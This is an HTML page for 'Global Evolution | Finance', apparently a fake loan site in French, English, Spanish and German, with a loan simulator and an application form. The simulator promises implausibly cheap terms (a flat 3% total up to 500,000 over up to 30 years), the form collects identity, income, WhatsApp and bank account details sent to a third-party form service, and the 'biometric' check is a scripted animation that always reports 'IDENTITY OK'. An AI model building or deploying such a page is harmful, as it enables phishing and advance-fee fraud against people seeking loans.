<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Global Evolution | Finance</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --primary: #1d4ed8; }
        body { background-color: #F8FAFC; color: #1e293b; }
        .step { display: none; animation: fadeIn 0.4s ease-out; }
        .step.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .glass-card { background: white; border-radius: 32px; border: 1px solid #e2e8f0; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }
        .btn-elite { background: var(--primary); color: white; transition: all 0.3s; box-shadow: 0 10px 25px rgba(29, 78, 216, 0.3); }
        .lang-card { border: 2px solid transparent; background: white; cursor: pointer; transition: 0.3s; }
        .lang-card.selected { border-color: var(--primary); background: #eff6ff; }
        .scan-line { width: 100%; height: 2px; background: #3b82f6; position: absolute; top: 0; left: 0; box-shadow: 0 0 10px #3b82f6; display: none; }
        @keyframes scanMove { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
        input { transition: all 0.2s; }
        input:focus { border-color: var(--primary); background: white; }
    </style>
</head>
<body class="font-sans">

    <section id="step-lang" class="step active min-h-screen flex-col items-center justify-center p-6 text-center">
        <h1 class="text-3xl font-black text-blue-900 mb-10 uppercase italic">GLOBAL EVOLUTION</h1>
        <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-10">
            <div onclick="selectLang('fr', '€')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-fr">
                <span class="text-3xl">🇫🇷</span><span class="font-bold text-[10px] uppercase">Français</span>
            </div>
            <div onclick="selectLang('en', '$')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-en">
                <span class="text-3xl">🇺🇸</span><span class="font-bold text-[10px] uppercase">English</span>
            </div>
            <div onclick="selectLang('es', '$')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-es">
                <span class="text-3xl">🇪🇸</span><span class="font-bold text-[10px] uppercase">Español</span>
            </div>
            <div onclick="selectLang('de', '€')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-de">
                <span class="text-3xl">🇩🇪</span><span class="font-bold text-[10px] uppercase">Deutsch</span>
            </div>
        </div>
        <button onclick="goToStep(2)" class="btn-elite w-full max-w-sm py-6 rounded-full font-black uppercase flex items-center justify-center gap-3">
            <span id="btn-cont-text">CONTINUER</span> <i class="fas fa-chevron-right"></i>
        </button>
    </section>

    <section id="step-sim" class="step min-h-screen flex-col p-4">
        <div class="max-w-xl mx-auto w-full pt-6">
            <div class="glass-card p-8">
                <h2 class="text-xl font-black text-blue-900 mb-8 text-center uppercase" id="sim-title">Simulateur</h2>
                <div class="space-y-10">
                    <div>
                        <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
                            <span id="lbl-amt">Montant</span>
                            <div class="flex items-center gap-2">
                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer" onclick="editAmount()"></i>
                                <span class="text-blue-700 text-lg"><span id="val-amt">1000</span> <span class="curr">€</span></span>
                            </div>
                        </div>
                        <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="1000" oninput="updateSim()" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
                    </div>
                    <div>
                        <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
                            <span id="lbl-dur">Durée</span>
                            <div class="flex items-center gap-2">
                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer" onclick="editYear()"></i>
                                <span class="text-blue-700 text-lg"><span id="val-dur">2</span> <span id="lbl-years">Ans</span></span>
                            </div>
                        </div>
                        <input type="range" id="yearRange" min="2" max="30" step="1" value="2" oninput="updateSim()" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
                    </div>
                </div>
                <div class="mt-10 bg-blue-900 p-8 rounded-[40px] text-white shadow-2xl">
                    <div class="flex justify-between items-center mb-4">
                        <span id="res-lbl-men" class="text-[10px] font-bold uppercase text-blue-300">Mensualité</span>
                        <span id="res-monthly" class="text-3xl font-black">--</span>
                    </div>
                    <div class="flex justify-between items-center border-t border-blue-800 pt-4">
                        <span id="res-lbl-tot" class="text-[10px] font-bold uppercase text-blue-300">Total (3% inclus)</span>
                        <span id="res-total" class="font-bold text-xl">--</span>
                    </div>
                </div>
                <button onclick="goToStep(3)" id="btn-next" class="btn-elite w-full py-6 rounded-full font-black mt-8 uppercase text-sm">Passer au dossier</button>
            </div>
        </div>
    </section>

    <section id="step-form" class="step min-h-screen flex-col p-4">
        <div class="max-w-xl mx-auto w-full pb-20">
            <div class="glass-card p-8">
                <form action="https://formspree.io/f/mzdkpgay" method="POST" onsubmit="handleFinalSubmit(event)">
                    <h2 class="text-2xl font-black text-blue-900 mb-6 uppercase text-center" id="form-title">Dossier Digital</h2>
                    
                    <div class="space-y-4">
                        <div class="grid grid-cols-2 gap-4">
                            <input type="text" name="Prenom" id="i-pre" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                            <input type="text" name="Nom" id="i-nom" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                        </div>
                        <input type="text" name="Adresse" id="i-adr" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                        <input type="text" name="Pays" id="i-pay" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                        <div class="grid grid-cols-2 gap-4">
                            <input type="text" name="Profession" id="i-pro" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                            <input type="text" name="Revenus" id="i-rev" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                        </div>
                        <input type="email" name="Email" id="i-mail" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                        <input type="tel" name="WhatsApp" id="i-wa" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                        
                        <div class="pt-4 border-t border-slate-100">
                            <p id="bank-info-msg" class="text-[10px] font-bold text-blue-600 uppercase mb-4 italic">Infos bancaires obligatoires</p>
                            <input type="text" name="Banque_Nom" id="i-bn" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
                            <input type="text" name="Banque_Compte" id="i-bc" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
                            <input type="text" name="Banque_Adresse" id="i-ba" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                        </div>
                    </div>

                    <div class="mt-8 p-8 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center cursor-pointer relative overflow-hidden" onclick="startScan()">
                        <div id="scan-line" class="scan-line"></div>
                        <div id="scan-icon" class="text-blue-200"><i class="fas fa-fingerprint text-7xl"></i></div>
                        <p id="scan-text" class="text-[10px] font-black text-blue-900 uppercase mt-4 tracking-widest">BIOMÉTRIE</p>
                    </div>

                    <button type="submit" id="btn-submit" class="btn-elite w-full py-6 rounded-full font-black uppercase text-sm mt-8">Confirmer l'inscription</button>
                </form>
            </div>
        </div>
    </section>

    <script>
        let cL = 'fr', cC = '€', isScanned = false;
        const tr = {
            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", btnSubmit: "Confirmer l'inscription", scan: "BIOMÉTRIE", scanWait: "ANALYSE...", scanOk: "IDENTITÉ OK", plPre: "Prénom", plNom: "Nom", plAdr: "Adresse", plPay: "Pays", plPro: "Profession", plRev: "Revenus mensuels", plMail: "E-mail", plWa: "WhatsApp", plBn: "Nom de la banque", plBc: "Numéro de compte", plBa: "Adresse de la banque", bankMsg: "Infos bancaires obligatoires pour le transfert", btnNext: "Passer au dossier" },
            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "DOSSIER", btnSubmit: "Confirm Now", scan: "BIOMETRICS", scanWait: "SCANNING...", scanOk: "IDENTITY OK", plPre: "First Name", plNom: "Last Name", plAdr: "Address", plPay: "Country", plPro: "Profession", plRev: "Monthly Income", plMail: "Email", plWa: "WhatsApp", plBn: "Bank Name", plBc: "Account Number", plBa: "Bank Address", bankMsg: "Bank info required for transfer", btnNext: "Next Step" },
            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", btnSubmit: "CONFIRMAR", scan: "BIOMETRÍA", scanWait: "ESCANEANDO...", scanOk: "IDENTIDAD OK", plPre: "Nombre", plNom: "Apellido", plAdr: "Dirección", plPay: "País", plPro: "Profesión", plRev: "Ingresos mensuales", plMail: "Correo electrónico", plWa: "WhatsApp", plBn: "Nombre de su banco", plBc: "Número de cuenta", plBa: "Dirección del banco", bankMsg: "Información bancaria obligatoria para la transferencia", btnNext: "PASAR AL EXPEDIENTE" },
            de: { cont: "WEITER", sim: "Simulator", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich", tot: "Gesamt (mit 3%)", fTitle: "AKTE", btnSubmit: "BESTÄTIGEN", scan: "BIOMETRIE", scanWait: "SCANNT...", scanOk: "IDENTITÄT OK", plPre: "Vorname", plNom: "Nachname", plAdr: "Adresse", plPay: "Land", plPro: "Beruf", plRev: "Monatliches Einkommen", plMail: "E-Mail", plWa: "WhatsApp", plBn: "Bankname", plBc: "Kontonummer", plBa: "Bankadresse", bankMsg: "Bankdaten für die Überweisung erforderlich", btnNext: "WEITER ZUR AKTE" }
        };

        function selectLang(l, c) {
            cL = l; cC = c;
            document.querySelectorAll('.lang-card').forEach(b => b.classList.remove('selected'));
            document.getElementById('btn-' + l).classList.add('selected');
            updateUI();
        }

        function updateSim() {
            const a = parseFloat(document.getElementById('amountRange').value);
            const y = parseInt(document.getElementById('yearRange').value);
            document.getElementById('val-amt').innerText = a.toLocaleString();
            document.getElementById('val-dur').innerText = y;
            const total = Math.round(a * 1.03); 
            const monthly = Math.round(total / (y * 12));
            document.getElementById('res-monthly').innerText = monthly.toLocaleString() + " " + cC;
            document.getElementById('res-total').innerText = total.toLocaleString() + " " + cC;
            document.querySelectorAll('.curr').forEach(e => e.innerText = cC);
        }

        function startScan() {
            if(isScanned) return;
            const line = document.getElementById('scan-line');
            line.style.display = 'block';
            line.style.animation = 'scanMove 2s infinite linear';
            document.getElementById('scan-text').innerText = tr[cL].scanWait;
            setTimeout(() => {
                line.style.display = 'none';
                document.getElementById('scan-icon').innerHTML = '<i class="fas fa-check-circle text-7xl text-green-500"></i>';
                document.getElementById('scan-text').innerText = tr[cL].scanOk;
                isScanned = true;
            }, 2500);
        }

        function updateUI() {
            const t = tr[cL];
            document.getElementById('btn-cont-text').innerText = t.cont;
            document.getElementById('sim-title').innerText = t.sim;
            document.getElementById('lbl-amt').innerText = t.amt;
            document.getElementById('lbl-dur').innerText = t.dur;
            document.getElementById('lbl-years').innerText = t.yr;
            document.getElementById('res-lbl-men').innerText = t.men;
            document.getElementById('res-lbl-tot').innerText = t.tot;
            document.getElementById('form-title').innerText = t.fTitle;
            document.getElementById('btn-submit').innerText = t.btnSubmit;
            document.getElementById('btn-next').innerText = t.btnNext;
            document.getElementById('bank-info-msg').innerText = t.bankMsg;
            
            document.getElementById('i-pre').placeholder = t.plPre;
            document.getElementById('i-nom').placeholder = t.plNom;
            document.getElementById('i-adr').placeholder = t.plAdr;
            document.getElementById('i-pay').placeholder = t.plPay;
            document.getElementById('i-pro').placeholder = t.plPro;
            document.getElementById('i-rev').placeholder = t.plRev;
            document.getElementById('i-mail').placeholder = t.plMail;
            document.getElementById('i-wa').placeholder = t.plWa;
            document.getElementById('i-bn').placeholder = t.plBn;
            document.getElementById('i-bc').placeholder = t.plBc;
            document.getElementById('i-ba').placeholder = t.plBa;
            updateSim();
        }

        function handleFinalSubmit(event) {
            if(!isScanned) { event.preventDefault(); alert(cL === 'es' ? "Por favor valide la biometría" : "Veuillez valider la biométrie"); }
        }

        function goToStep(s) {
            document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
            document.getElementById(['','step-lang','step-sim','step-form'][s]).classList.add('active');
            window.scrollTo(0,0);
        }

        function editAmount() { let n = prompt("Montant :", 1000); if(n) { document.getElementById('amountRange').value = n; updateSim(); } }
        function editYear() { let n = prompt("Années :", 2); if(n) { document.getElementById('yearRange').value = n; updateSim(); } }

        window.onload = () => { selectLang('fr', '€'); };
    </script>
</body>
                                </html>
